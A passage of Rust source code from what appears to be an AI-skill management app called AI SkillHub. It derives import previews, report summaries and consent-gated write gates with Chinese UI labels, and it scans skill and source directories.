            title: "恢复流程 dry-run".to_string(),
            risk_level: "medium".to_string(),
            status: "planned".to_string(),
            summary: "先做 dry-run：只打印将恢复哪些路径、删除哪些链接、复制哪些备份，不执行真实文件操作。".to_string(),
        },
        RollbackPlanStepCard {
            id: stable_id("rollback-step", &format!("{}-real-rollback", snapshot_id)),
            snapshot_id: snapshot_id.to_string(),
            step_order: 5,
            title: "真实回滚执行".to_string(),
            risk_level: "high".to_string(),
            status: "locked".to_string(),
            summary: "只有在备份、dry-run、路径安全检查全部通过后，才允许开放真实回滚按钮。".to_string(),
        },
    ]
}

fn category_label(value: &str) -> String {
    let trimmed = value.trim();
    if trimmed.is_empty() || trimmed.eq_ignore_ascii_case("auto") {
        "自动分类".to_string()
    } else {
        trimmed.to_string()
    }
}

fn preset_color(index: usize) -> &'static str {
    const COLORS: [&str; 8] = [
        "mint", "sky", "violet", "peach", "rose", "amber", "slate", "teal",
    ];
    COLORS[index % COLORS.len()]
}

fn tag_color(name: &str) -> String {
    match normalize_lookup_key(name).as_str() {
        "academic-writing" | "paper-research" | "论文科研" => "mint".to_string(),
        "ui-design" | "界面设计" | "设计" => "violet".to_string(),
        "security" | "安全" => "rose".to_string(),
        "agent-tools" | "智能体工具" => "sky".to_string(),
        "prompt" | "提示词" => "amber".to_string(),
        "scientific-figures" | "科研图表" => "teal".to_string(),
        _ => {
            let mut hasher = DefaultHasher::new();
            name.hash(&mut hasher);
            match hasher.finish() % 8 {
                0 => "mint",
                1 => "sky",
                2 => "violet",
                3 => "peach",
                4 => "rose",
                5 => "amber",
                6 => "slate",
                _ => "teal",
            }
            .to_string()
        }
    }
}

fn runner_title(runner_id: &str) -> String {
    match runner_id {
        "diagnostics-export" => "诊断包导出",
        "share-validation" => "分享验收",
        "report-bundle" => "报告包索引",
        "write-execution-plan" => "真实写入执行计划",
        "agent-sync-readiness" => "AI 工具同步解锁检查",
        "release-package-readiness" => "发布打包解锁检查",
        "agent-sync-executor" => "AI 工具同步最终执行器",
        "release-package-executor" => "发布打包最终执行器",
        "v2-completion-audit" => "完成度审计",
        "release-package" => "发布打包计划",
        _ => "执行器",
    }
    .to_string()
}

fn runner_report_folder(runner_id: &str) -> &'static str {
    match runner_id {
        "diagnostics-export" => "diagnostics",
        "share-validation" => "share-validation",
        "report-bundle" => "report-bundle",
        "write-execution-plan" => "write-execution-plan",
        "agent-sync-readiness" => "real-write-readiness",
        "release-package-readiness" => "real-write-readiness",
        "agent-sync-executor" => "real-write-execution",
        "release-package-executor" => "real-write-execution",
        "v2-completion-audit" => "v2-completion-audit",
        "release-package" => "release-package",
        _ => "unknown",
    }
}

fn operation_runner_catalog() -> Vec<(&'static str, &'static str, bool, &'static str, &'static str)>
{
    vec![
        (
            "diagnostics-export",
            "diagnostics",
            false,
            "可导出脱敏诊断摘要，用于定位环境与数据问题。",
            "生成最新 v2 诊断报告。",
        ),
        (
            "share-validation",
            "share-validation",
            false,
            "可运行分享版验收计划，确认别人电脑缺工具时也能看懂原因。",
            "生成分享验收报告。",
        ),
        (
            "report-bundle",
            "report-bundle",
            false,
            "汇总已生成的诊断、分享和发布计划报告，只输出报告索引，不制作发布包。",
            "先运行前置执行器，再生成最终报告包索引。",
        ),
        (
            "write-execution-plan",
            "write-plan",
            false,
            "把真实导入、同步和打包闸门合成可审计执行计划，包含阻断项和回滚预案。",
            "生成真实写入执行计划报告。",
        ),
        (
            "agent-sync-readiness",
            "real-write-check",
            false,
            "检查 AI 工具接管同步是否满足真实执行条件；只写报告，不改工具目录。",
            "生成 AI 工具同步解锁检查报告。",
        ),
        (
            "release-package-readiness",
            "real-write-check",
            false,
            "检查正式发布包是否满足真实打包条件；只写报告，不生成候选包。",
            "生成发布打包解锁检查报告。",
        ),
        (
            "agent-sync-executor",
            "real-write-executor",
            false,
            "最终 AI 工具同步执行器入口；条件未满足时只生成阻断报告，不改工具目录。",
            "生成最终执行尝试报告。",
        ),
        (
            "release-package-executor",
            "real-write-executor",
            false,
            "最终发布打包执行器入口；条件未满足时只生成阻断报告，不生成发布包。",
            "生成最终打包尝试报告。",
        ),
        (
            "v2-completion-audit",
            "completion-audit",
            false,
            "检查 AI SkillHub 是否可以称为完整版本，并列出剩余发布阻断项。",
            "生成完成度审计报告。",
        ),
        (
            "release-package",
            "release-package",
            true,
            "发布打包仍锁定，只能生成计划，不会制作正式包。",
            "完成最终 QA 后再开放真实打包。",
        ),
    ]
}

fn path_file_name(path: &Path) -> String {
    path.file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("report")
        .to_string()
}

fn stable_id(prefix: &str, value: &str) -> String {
    let slug = value
        .chars()
        .map(|character| {
            if character.is_ascii_alphanumeric() {
                character.to_ascii_lowercase()
            } else {
                '-'
            }
        })
        .collect::<String>()
        .split('-')
        .filter(|part| !part.is_empty())
        .collect::<Vec<_>>()
        .join("-");

    let mut hasher = DefaultHasher::new();
    value.hash(&mut hasher);
    let hash = format!("{:016x}", hasher.finish());
    let suffix = &hash[..10];

    if slug.is_empty() {
        format!("{}-{}", prefix, suffix)
    } else {
        format!("{}-{}-{}", prefix, slug, suffix)
    }
}

fn unix_timestamp_string() -> String {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|duration| duration.as_nanos().to_string())
        .unwrap_or_else(|_| "0".to_string())
}

fn current_unix_nanos() -> u128 {
    unix_timestamp_string().parse::<u128>().unwrap_or(0)
}

fn parse_diagnostic_summary(diagnostics: Option<&Value>) -> DiagnosticSummary {
    let Some(root) = diagnostics else {
        return DiagnosticSummary {
            available: false,
            app_version: String::new(),
            generated_at: String::new(),
            overall_status: "missing".to_string(),
            ok: 0,
            warn: 0,
            error: 0,
            info: 0,
        };
    };

    let summary = root.get("summary").unwrap_or(&Value::Null);
    DiagnosticSummary {
        available: true,
        app_version: json_string(root, "appVersion"),
        generated_at: json_string(root, "generatedAt"),
        overall_status: json_string(root, "overallStatus"),
        ok: json_u64(summary, "ok"),
        warn: json_u64(summary, "warn"),
        error: json_u64(summary, "error"),
        info: json_u64(summary, "info"),
    }
}

fn derive_import_previews(
    sources_dir: &Path,
    sources: &[SourceCard],
    release_reports: &[ReleaseReportCard],
) -> Vec<ImportPreviewCard> {
    let github_sources: Vec<&SourceCard> = sources
        .iter()
        .filter(|source| !source.url.trim().is_empty())
        .collect();
    let local_sources: Vec<&SourceCard> = sources
        .iter()
        .filter(|source| source.url.trim().is_empty() && !source.local_path.trim().is_empty())
        .collect();
    let github_skill_count = github_sources
        .iter()
        .map(|source| source.skill_count)
        .sum::<usize>();
    let github_prompt_count = github_sources
        .iter()
        .filter(|source| source.source_type.eq_ignore_ascii_case("prompt"))
        .count();
    let local_skill_count = local_sources
        .iter()
        .map(|source| source.skill_count)
        .sum::<usize>();
    let local_prompt_count = local_sources
        .iter()
        .filter(|source| source.source_type.eq_ignore_ascii_case("prompt"))
        .count();
    let zip_report = release_reports
        .iter()
        .find(|report| report.id == "zip-preview" || report.report_type == "zip-preview-test");

    vec![
        ImportPreviewCard {
            id: "import-github".to_string(),
            title: "GitHub 仓库导入".to_string(),
            import_kind: "github".to_string(),
            status: if github_sources.is_empty() {
                "empty"
            } else {
                "ready"
            }
            .to_string(),
            summary: if github_sources.is_empty() {
                "还没有已登记的 GitHub 来源。".to_string()
            } else {
                format!("已索引 {} 个 GitHub 来源。", github_sources.len())
            },
            detail: format!(
                "下一步只做 clone/pull 预览，不直接安装；来源目录：{}。",
                sources_dir.display()
            ),
            skill_count: github_skill_count,
            prompt_count: github_prompt_count,
            safe_to_continue: true,
        },
        ImportPreviewCard {
            id: "import-local".to_string(),
            title: "本地文件夹导入".to_string(),
            import_kind: "local".to_string(),
            status: if local_sources.is_empty() {
                "empty"
            } else {
                "ready"
            }
            .to_string(),
            summary: if local_sources.is_empty() {
                "还没有单独登记的本地来源。".to_string()
            } else {
                format!("已识别 {} 个本地来源。", local_sources.len())
            },
            detail: "只有包含 SKILL.md 的目录会被视为 Skill；Prompt 资料会继续标记为资料源。"
                .to_string(),
            skill_count: local_skill_count,
            prompt_count: local_prompt_count,
            safe_to_continue: true,
        },
        ImportPreviewCard {
            id: "import-zip".to_string(),
            title: "zip / .skill 包导入".to_string(),
            import_kind: "zip".to_string(),
            status: zip_report
                .map(|report| report.status.clone())
                .unwrap_or_else(|| "missing".to_string()),
            summary: zip_report
                .map(|report| report.summary.clone())
                .unwrap_or_else(|| "还没有 v2 可复用的 zip 预览报告。".to_string()),
            detail: if zip_report.map(|report| report.ok).unwrap_or(false) {
                "zip slip 防护和 SKILL.md 预览已通过；当前仍保持只读，不会真实解压。"
            } else {
                "必须先通过路径穿越防护、SKILL.md 预览和重复名称检查，才能进入真实导入。"
            }
            .to_string(),
            skill_count: 0,
            prompt_count: 0,
            safe_to_continue: zip_report.map(|report| report.ok).unwrap_or(false),
        },
    ]
}

#[allow(clippy::too_many_arguments)]
fn derive_write_gates(
    diagnostics: &DiagnosticSummary,
    release_reports: &[ReleaseReportCard],
    import_previews: &[ImportPreviewCard],
    backup_dry_run: &[BackupDryRunItemCard],
    restore_dry_run: &[RestoreDryRunItemCard],
    rollback_plan: &[RollbackPlanStepCard],
    desktop_qa_checks: &[DesktopQaCheckCard],
    agent_adapters: &[AgentAdapterCard],
    operation_runners: &[OperationRunnerCard],
    operator_consent: &OperatorConsentCard,
) -> Vec<WriteGateCard> {
    let diagnostics_ok = diagnostics.available && diagnostics.error == 0;
    let github_import_ready = import_preview_ready(import_previews, "github");
    let local_import_ready = import_preview_ready(import_previews, "local");
    let zip_import_ready = import_preview_ready(import_previews, "zip");
    let backup_ready =
        dry_run_ready_for_write(backup_dry_run.iter().map(|item| item.status.as_str()));
    let restore_ready =
        dry_run_ready_for_write(restore_dry_run.iter().map(|item| item.status.as_str()));
    let rollback_ready = rollback_plan_ready_for_write(rollback_plan);
    let desktop_qa_ready = required_desktop_qa_passed(desktop_qa_checks);
    let managed_agent_ready = agent_adapters
        .iter()
        .any(|adapter| adapter.detected && adapter.enabled && adapter.managed);
    let report_bundle_ready = operation_runner_has_latest(operation_runners, "report-bundle");
    let agent_sync_readiness_ready =
        operation_runner_has_latest(operation_runners, "agent-sync-readiness");
    let release_package_readiness_ready =
        operation_runner_has_latest(operation_runners, "release-package-readiness");

    vec![
        write_gate_card(
            "github-import",
            "GitHub 来源真实导入",
            "clone-pull",
            "medium",
            vec![
                (diagnostics_ok, "诊断报告没有 error".to_string()),
                (
                    github_import_ready,
                    "已生成 GitHub 来源导入预览".to_string(),
                ),
                (
                    report_bundle_ready,
                    "报告包索引已汇总最新导入和发布输入".to_string(),
                ),
                (
                    true,
                    "GitHub 来源已支持 staging clone，并可提升到 app-next/data/github_sources。"
                        .to_string(),
                ),
            ],
            vec![
                "标准化 GitHub URL 并锁定目标来源目录。".to_string(),
                "执行 clone/pull dry-run，记录将新增、更新或跳过的来源。".to_string(),
                "对新增来源扫描直接包含 SKILL.md 的目录，并区分 Prompt 资料。".to_string(),
                "刷新 SQLite 索引，但不修改任何 AI 工具目录。".to_string(),
            ],
            vec![
                "保留 clone/pull 前的来源清单快照。".to_string(),
                "失败时删除本次新增的临时来源目录，保留旧来源。".to_string(),
            ],
            "先生成具体来源的 dry-run 计划，再执行 staging 和受管理来源提升。",
        ),
        write_gate_card(
            "local-zip-import",
            "本地 / zip 真实导入",
            "local-zip-copy",
            "high",
            vec![
                (diagnostics_ok, "诊断报告没有 error".to_string()),
                (
                    local_import_ready || zip_import_ready,
                    "本地文件夹或 zip/.skill 导入预览已通过".to_string(),
                ),
                (
                    zip_import_ready,
                    "zip 路径穿越、重复 Skill 和 SKILL.md 预览已通过".to_string(),
                ),
                (
                    true,
                    "本地 / zip 来源已支持隔离 staging，并可提升到 app-next/data/github_sources。"
                        .to_string(),
                ),
            ],
            vec![
                "先复制/解压到临时隔离目录。".to_string(),
                "扫描 SKILL.md、重复名称、路径穿越和超大文件。".to_string(),
                "生成目标目录和备份目录清单。".to_string(),
                "只在安全报告通过后才允许移动到正式来源目录。".to_string(),
            ],
            vec![
                "保留导入前来源目录索引。".to_string(),
                "失败时删除临时目录，不碰正式 skills 和 AI 工具目录。".to_string(),
            ],
            "先生成 dry-run 和 staging 结果，再提升为受管理来源。",
        ),
        write_gate_card(
            "agent-sync",
            "AI 工具真实接管同步",
            "agent-link-sync",
            "high",
            vec![
                (diagnostics_ok, "诊断报告没有 error".to_string()),
                (
                    managed_agent_ready,
                    "至少有一个已检测、已启用且由 AI SkillHub 管理的 AI 工具适配器".to_string(),
                ),
                (
                    backup_ready,
                    "备份 dry-run 无 planned / blocked 项".to_string(),
                ),
                (
                    restore_ready,
                    "恢复 dry-run 无 planned / blocked 项".to_string(),
                ),
                (
                    rollback_ready,
                    "回滚计划没有 locked / planned 步骤".to_string(),
                ),
                (desktop_qa_ready, "必需桌面 QA 已全部通过".to_string()),
                (
                    agent_sync_readiness_ready,
                    "AI 工具同步解锁检查报告已生成；真实执行仍需用户确认。".to_string(),
                ),
                (
                    operator_consent.real_writes_enabled,
                    "用户已在界面手动开启真实写入授权开关。".to_string(),
                ),
            ],
            vec![
                "冻结 v2 SQLite 快照和当前启用 Skill 清单。".to_string(),
                "备份每个已接管 AI 工具的目标 skills 目录。".to_string(),
                "生成将创建/替换/删除的链接或复制项清单。".to_string(),
                "逐工具执行，同步后立即验证目录、链接和文件数量。".to_string(),
            ],
            vec![
                "从备份目录恢复每个 AI 工具原始 skills 目录。".to_string(),
                "撤销本次创建的托管链接，保留用户非托管文件。".to_string(),
            ],
            "先让备份、恢复、回滚和桌面 QA 全部变成可审计通过状态。",
        ),
        write_gate_card(
            "release-package",
            "正式发布包生成",
            "release-package",
            "medium",
            vec![
                (diagnostics_ok, "诊断报告没有 error".to_string()),
                (
                    release_report_ok(release_reports, "release-preflight"),
                    "发布预检报告通过".to_string(),
                ),
                (
                    release_report_ok(release_reports, "share-recipient"),
                    "分享验收报告通过".to_string(),
                ),
                (
                    release_report_ok(release_reports, "zip-preview"),
                    "zip 预览报告通过".to_string(),
                ),
                (desktop_qa_ready, "必需桌面 QA 已全部通过".to_string()),
                (report_bundle_ready, "报告包索引已生成".to_string()),
                (
                    release_package_readiness_ready,
                    "发布打包解锁检查报告已生成；真实打包仍需用户确认。".to_string(),
                ),
                (
                    operator_consent.real_writes_enabled,
                    "用户已在界面手动开启真实写入授权开关。".to_string(),
                ),
            ],
            vec![
                "运行诊断、分享验收、发布预检、zip 预览和报告包索引。".to_string(),
                "确认 Git 状态和公开仓库排除 personal skills / reports / local paths。".to_string(),
                "生成发布目录、校验清单、版本说明和 SHA256。".to_string(),
                "只在用户确认后推送 tag / release。".to_string(),
            ],
            vec![
                "发布前保留本地 release manifest。".to_string(),
                "若打包失败，删除本次生成的候选包并保留上一个稳定包。".to_string(),
            ],
            "完成全部报告与桌面 QA 后，再把 release-package 从计划模式切到真实打包。",
        ),
    ]
}

#[allow(clippy::too_many_arguments)]
fn write_gate_card(
    id: &str,
    title: &str,
    operation_type: &str,
    risk_level: &str,
    checks: Vec<(bool, String)>,
    plan_steps: Vec<String>,
    rollback_steps: Vec<String>,
    next_action: &str,
) -> WriteGateCard {
    let (passing_checks, blocking_checks) = split_write_gate_checks(checks);
    let status = if blocking_checks.is_empty() {
        "locked"
    } else {
        "blocked"
    };
    let summary = if blocking_checks.is_empty() {
        "前置条件已满足，但真实写入仍保持产品级锁定。".to_string()
    } else {
        format!(
            "还有 {} 个条件未满足；真实写入保持关闭。",
            blocking_checks.len()
        )
    };

    WriteGateCard {
        id: id.to_string(),
        title: title.to_string(),
        operation_type: operation_type.to_string(),
        status: status.to_string(),
        unlocked: false,
        risk_level: risk_level.to_string(),
        summary,
        next_action: next_action.to_string(),
        plan_steps,
        rollback_steps,
        passing_checks,
        blocking_checks,
    }
}

fn split_write_gate_checks(checks: Vec<(bool, String)>) -> (Vec<String>, Vec<String>) {
    let mut passing_checks = Vec::new();
    let mut blocking_checks = Vec::new();
    for (passed, label) in checks {
        if passed {
            passing_checks.push(label);
        } else {
            blocking_checks.push(label);
        }
    }
    (passing_checks, blocking_checks)
}

fn import_preview_ready(import_previews: &[ImportPreviewCard], import_kind: &str) -> bool {
    import_previews.iter().any(|preview| {
        preview.import_kind == import_kind && preview.safe_to_continue && preview.status != "empty"
    })
}

fn release_report_ok(release_reports: &[ReleaseReportCard], report_id: &str) -> bool {
    release_reports
        .iter()
        .any(|report| report.id == report_id && report.ok && report.error == 0)
}

fn operation_runner_has_latest(operation_runners: &[OperationRunnerCard], runner_id: &str) -> bool {
    operation_runners.iter().any(|runner| {
        runner.id == runner_id
            && runner.file_count > 0
            && !runner.latest_json_path.trim().is_empty()
            && !runner.latest_markdown_path.trim().is_empty()
    })
}

fn dry_run_ready_for_write<'a>(statuses: impl Iterator<Item = &'a str>) -> bool {
    let mut saw_relevant = false;
    for status in statuses {
        match status {
            "ready" | "skipped" => saw_relevant = true,
            "planned" | "blocked" | "locked" | "error" => return false,
            _ => {}
        }
    }
    saw_relevant
}

fn rollback_plan_ready_for_write(rollback_plan: &[RollbackPlanStepCard]) -> bool {
    !rollback_plan.is_empty()
        && rollback_plan
            .iter()
            .all(|step| matches!(step.status.as_str(), "ready" | "skipped"))
}

fn required_desktop_qa_passed(desktop_qa_checks: &[DesktopQaCheckCard]) -> bool {
    desktop_qa_checks
        .iter()
        .filter(|check| check.required)
        .all(|check| check.status == "passed")
        && desktop_qa_checks.iter().any(|check| check.required)
}

fn derive_release_reports(root: &Path) -> Vec<ReleaseReportCard> {
    let reports_root = reports_dir(root);
    let candidates = [
        release_report_from_diagnostics(&reports_root.join("latest-diagnostics.json")),
        release_report_from_release_preflight(
            &reports_root
                .join("release-preflight")
                .join("latest-release-preflight.json"),
        ),
        release_report_from_share_recipient(
            &reports_root
                .join("share-recipient-test")
                .join("latest-share-recipient-test.json"),
        ),
        release_report_from_zip_preview(
            &reports_root
                .join("zip-preview-test")
                .join("latest-zip-preview-test.json"),
        ),
    ];

    candidates.into_iter().flatten().collect()
}

fn release_report_from_diagnostics(path: &Path) -> Option<ReleaseReportCard> {
    let root = read_json(path)?;
    let summary = root.get("summary").unwrap_or(&Value::Null);
    let ok = json_u64(summary, "ok");
    let warn = json_u64(summary, "warn");
    let error = json_u64(summary, "error");
    let info = json_u64(summary, "info");
    let total = json_u64(summary, "checks").max(ok + warn + error + info);
    let status = non_empty_or(json_string(&root, "overallStatus"), "missing");

    Some(ReleaseReportCard {
        id: "diagnostics".to_string(),
        title: "诊断包结果".to_string(),
        report_type: "diagnostics".to_string(),
        status: status.clone(),
        generated_at: json_string(&root, "generatedAt"),
        version: json_string(&root, "appVersion"),
        ok: status == "ok" && error == 0,
        total,
        passed: ok,
        warn,
        error,
        summary: format!(
            "诊断报告：{} ok / {} warn / {} error / {} info。",
            ok, warn, error, info
        ),
    })
}

fn release_report_from_release_preflight(path: &Path) -> Option<ReleaseReportCard> {
    let root = read_json(path)?;
    let checks = root
        .get("checks")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default();
    let total = checks.len() as u64;
    let passed = count_status(&checks, "ok");
    let warn = count_status(&checks, "warn");
    let error = total.saturating_sub(passed + warn);
    let status = non_empty_or(
        json_string(&root, "overallStatus"),
        if json_bool(&root, "ok") {
            "ok"
        } else {
            "error"
        },
    );
    let package_name = non_empty_or(json_string(&root, "packageName"), "未生成");

    Some(ReleaseReportCard {
        id: "release-preflight".to_string(),
        title: "发布预检".to_string(),
        report_type: "release-preflight".to_string(),
        status: status.clone(),
        generated_at: json_string(&root, "generatedAt"),
        version: json_string(&root, "version"),
        ok: status == "ok" && error == 0,
        total,
        passed,
        warn,
        error,
        summary: format!(
            "发布预检：{}/{} 项通过；当前包名 {}。",
            passed, total, package_name
        ),
    })
}

fn release_report_from_share_recipient(path: &Path) -> Option<ReleaseReportCard> {
    let root = read_json(path)?;
    let cases = root
        .get("cases")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default();
    let total = cases.len() as u64;
    let passed = cases.iter().filter(|case| json_bool(case, "ok")).count() as u64;
    let warn = count_status(&cases, "warn");
    let error = count_status(&cases, "error");
    let ok = json_bool(&root, "ok");

    Some(ReleaseReportCard {
        id: "share-recipient".to_string(),
        title: "分享验收".to_string(),
        report_type: "share-recipient-test".to_string(),
        status: if ok { "ok" } else { "error" }.to_string(),
        generated_at: json_string(&root, "generatedAt"),
        version: json_string(&root, "appVersion"),
        ok,
        total,
        passed,
        warn,
        error,
        summary: format!(
            "分享验收：{}/{} 个场景按预期通过；含无 Codex、缺 Git/WebView2 等模拟场景。",
            passed, total
        ),
    })
}

fn release_report_from_zip_preview(path: &Path) -> Option<ReleaseReportCard> {
    let root = read_json(path)?;
    let result = root.get("result").unwrap_or(&Value::Null);
    let checks = [
        json_bool(&root, "ok"),
        json_bool(result, "previewOk"),
        json_bool(result, "safeExtracted"),
        json_bool(result, "traversalBlocked"),
    ];
    let passed = checks.iter().filter(|item| **item).count() as u64;
    let ok = checks.iter().all(|item| *item);
    let skill_count = json_u64(result, "previewSkillCount");

    Some(ReleaseReportCard {
        id: "zip-preview".to_string(),
        title: "zip 导入预览".to_string(),
        report_type: "zip-preview-test".to_string(),
        status: if ok { "ok" } else { "error" }.to_string(),
        generated_at: json_string(&root, "generatedAt"),
        version: String::new(),
        ok,
        total: checks.len() as u64,
        passed,
        warn: 0,
        error: checks.len() as u64 - passed,
        summary: format!(
            "zip 预览：{} 个 Skill 可识别；路径穿越防护{}。",
            skill_count,
            if json_bool(result, "traversalBlocked") {
                "已通过"
            } else {
                "未通过"
            }
        ),
    })
}

fn count_status(items: &[Value], status: &str) -> u64 {
    items
        .iter()
        .filter(|item| json_string(item, "status") == status)
        .count() as u64
}

fn non_empty_or(value: String, fallback: &str) -> String {
    if value.is_empty() {
        fallback.to_string()
    } else {
        value
    }
}

fn parse_diagnostic_skills(diagnostics: Option<&Value>) -> HashMap<String, SkillDiagnostic> {
    let mut result = HashMap::new();
    let Some(skills) = diagnostics
        .and_then(|root| root.get("skills"))
        .and_then(Value::as_array)
    else {
        return result;
    };

    for item in skills {
        let folder = json_string(item, "folder");
        if folder.is_empty() {
            continue;
        }
        result.insert(
            folder.to_lowercase(),
            SkillDiagnostic {
                name: json_string(item, "name"),
                description: json_string(item, "description"),
                repo: json_string(item, "repo"),
                target: json_string(item, "target"),
                has_skill_md: json_bool(item, "hasSkillMd"),
                has_front_matter: json_bool(item, "hasFrontMatter"),
            },
        );
    }
    result
}

fn merge_managed_link_skills(root: &Path, diagnostics: &mut HashMap<String, SkillDiagnostic>) {
    let managed_links_file = private_state_dir(root)
        .join("sync-state")
        .join("managed-links.json");
    let Some(managed_links_json) = read_json(&managed_links_file) else {
        return;
    };
    let Some(items) = managed_links_json.as_array() else {
        return;
    };

    for item in items {
        let folder = json_string(item, "Skill");
        if folder.is_empty() {
            continue;
        }

        let target = json_string(item, "Target");
        let target_path = PathBuf::from(target.trim());
        if target.is_empty() || !target_path.is_dir() || !target_path.join("SKILL.md").is_file() {
            // Managed state is historical input, not proof that a Skill still
            // exists. Older releases could leave a junction after regenerating
            // its router directory; do not resurrect that stale entry as a
            // healthy diagnostic Skill.
            continue;
        }

        let diagnostic = diagnostics.entry(folder.to_lowercase()).or_default();
        if diagnostic.name.is_empty() {
            diagnostic.name = folder.clone();
        }
        let description = json_string(item, "Description");
        if diagnostic.description.is_empty() && !description.is_empty() {
            diagnostic.description = description;
        }
        let repo = json_string(item, "Repo");
        if !repo.is_empty() {
            diagnostic.repo = repo;
        }
        diagnostic.target = target;
        diagnostic.has_skill_md = true;
        diagnostic.has_front_matter = !diagnostic.description.is_empty();
    }
}

fn parse_configured_sources(config: Option<&Value>) -> HashMap<String, SourceConfig> {
    let mut result = HashMap::new();
    let Some(repositories) = config
        .and_then(|root| root.get("repositories"))
        .and_then(Value::as_array)
    else {
        return result;
    };

    for item in repositories {
        let name = json_string(item, "name");
        if name.is_empty() {
            continue;
        }
        result.insert(
            name.to_lowercase(),
            SourceConfig {
                name,
                url: json_string(item, "url"),
                source_type: normalize_source_type(&json_string(item, "type")),
                mode: json_string(item, "mode"),
                category_id: json_string(item, "categoryId"),
                note: compact_note(&json_string(item, "note")),
            },
        );
    }
    result
}

fn scan_sources(
    sources_dir: &Path,
    configured_sources: &HashMap<String, SourceConfig>,
) -> Vec<SourceCard> {
    let mut sources = Vec::new();

    if let Ok(entries) = fs::read_dir(sources_dir) {
        for entry in entries.flatten() {
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if !file_type.is_dir() {
                continue;
            }

            let folder_name = entry.file_name().to_string_lossy().to_string();
            if folder_name.eq_ignore_ascii_case(ROUTER_HUB_FOLDER) {
                continue;
            }
            let config = configured_sources.get(&folder_name.to_lowercase());
            let inferred = metadata::analyze_source(&entry.path());
            let source_type = config
                .map(|item| item.source_type.clone())
                .unwrap_or_else(|| infer_source_type(&entry.path()));
            let configured_category = config
                .map(|item| item.category_id.trim())
                .filter(|value| !value.is_empty() && !value.eq_ignore_ascii_case("auto"));
            let configured_note = config
                .map(|item| item.note.trim())
                .filter(|value| !value.is_empty());
            let has_configured_metadata =
                configured_category.is_some() || configured_note.is_some();
            let inferred_note = inferred.summary.clone();

            sources.push(SourceCard {
                id: stable_id("source", &folder_name),
                name: config
                    .map(|item| item.name.clone())
                    .unwrap_or(folder_name.clone()),
                source_type,
                health: source_health(&entry.path(), config),
                url: config
                    .map(|item| item.url.clone())
                    .filter(|value| !value.trim().is_empty())
                    .unwrap_or_else(|| inferred.git_origin.clone()),
                skill_count: 0,
                mode: config
                    .map(|item| item.mode.clone())
                    .filter(|value| !value.is_empty())
                    .unwrap_or_else(|| "scan".to_string()),
                category_id: configured_category
                    .map(str::to_string)
                    .unwrap_or_else(|| inferred.category.clone()),
                note: configured_note.map(str::to_string).unwrap_or(inferred_note),
                local_path: entry.path().display().to_string(),
                enabled: true,
                rating: 0,
                tags: inferred.tags,
                created_at: source_created_at(&entry.path()),
                usage_guide: inferred.usage_guide,
                metadata_origin: if has_configured_metadata {
                    format!("configured+{}", inferred.origin)
                } else {
                    inferred.origin
                },
                metadata_confidence: if has_configured_metadata {
                    inferred.confidence.max(0.95)
                } else {
                    inferred.confidence
                },
                user_folder_id: String::new(),
                user_folder_name: String::new(),
                user_folder_color: String::new(),
            });
        }
    }

    sources
}

fn scan_skills(
    skills_dir: &Path,
    sources_dir: &Path,
    diagnostics: &HashMap<String, SkillDiagnostic>,
    configured_sources: &HashMap<String, SourceConfig>,
) -> Vec<SkillCard> {
    let mut skills = Vec::new();

    let Ok(entries) = fs::read_dir(skills_dir) else {
        return skills;
    };

    for entry in entries.flatten() {
        let Ok(file_type) = entry.file_type() else {
            continue;
        };
        if !file_type.is_dir() && !file_type.is_symlink() {
            continue;
        }

        let folder_name = entry.file_name().to_string_lossy().to_string();
        let diagnostic = diagnostics.get(&folder_name.to_lowercase());
        let target = diagnostic
            .map(|item| item.target.clone())
            .filter(|value| !value.is_empty())
            .or_else(|| {
                fs::read_link(entry.path())
                    .ok()
                    .map(|path| path.display().to_string())
            })
            .unwrap_or_default();
        let source = diagnostic
            .map(|item| item.repo.clone())
            .filter(|value| !value.is_empty())
            .or_else(|| infer_source_name(&target, sources_dir))
            .unwrap_or_else(|| "local".to_string());
        let inferred = metadata::analyze_skill(&entry.path());
        let category = configured_sources
            .get(&source.to_lowercase())
            .map(|source| source.category_id.clone())
            .filter(|value| !value.is_empty() && !value.eq_ignore_ascii_case("auto"))
            .unwrap_or_else(|| inferred.category.clone());
        let description = diagnostic
            .map(|item| item.description.clone())
            .filter(|value| !value.is_empty())
            .map(|value| metadata::concise_skill_summary(&value))
            .unwrap_or_else(|| inferred.summary.clone());

        let name = diagnostic
            .map(|item| item.name.clone())
            .filter(|value| !value.is_empty())
            .unwrap_or_else(|| folder_name.clone());
        let relative_path = format!("skills\\{}", folder_name);
        let is_router_hub =
            compute_is_router_hub(&description, &target, &source, &folder_name, &name);
        skills.push(SkillCard {
            id: stable_id("skill", &folder_name),
            source_id: String::new(),
            name,
            folder_name: folder_name.clone(),
            category,
            description,
            note: String::new(),
            source,
            health: skill_health(&entry.path(), diagnostic),
            enabled: true,
            rating: 0,
            relative_path,
            tags: inferred.tags,
            usage_guide: inferred.usage_guide,
            metadata_origin: inferred.origin,
            metadata_confidence: inferred.confidence,
            is_router_hub,
            user_folder_id: String::new(),
            user_folder_name: String::new(),
            user_folder_color: String::new(),
        });
    }

    skills
}

fn scan_source_tree_skills(
    sources_dir: &Path,
    sources: &[SourceCard],
    configured_sources: &HashMap<String, SourceConfig>,
    existing_skills: &[SkillCard],
) -> Vec<SkillCard> {
    let mut skills = Vec::new();
    let mut known_identity_keys: HashSet<String> = HashSet::new();
    let mut used_folder_names: HashSet<String> = HashSet::new();

    for skill in existing_skills {
        known_identity_keys.insert(source_skill_identity_key(&skill.source, &skill.name));
        used_folder_names.insert(skill.folder_name.to_lowercase());
    }

    for source in sources {
        if source.name.eq_ignore_ascii_case(ROUTER_HUB_FOLDER) {
            continue;
        }

        let source_path = PathBuf::from(&source.local_path);
        if !source_path.exists() || !source_path.starts_with(sources_dir) {
            continue;
        }
        if source.source_type.eq_ignore_ascii_case("prompt")
            && !has_skill_md_descendant(&source_path)
        {
            continue;
        }

        for skill_dir in collect_skill_dirs_from_source(&source_path) {
            let skill_md = skill_dir.join("SKILL.md");
            let name = read_skill_name(&skill_md)
                .or_else(|| {
                    skill_dir
                        .file_name()
                        .and_then(|value| value.to_str())
                        .map(|value| value.to_string())
                })
                .unwrap_or_else(|| source.name.clone());
            let identity_key = source_skill_identity_key(&source.name, &name);
            if known_identity_keys.contains(&identity_key) {
                continue;
            }

            let folder_name =
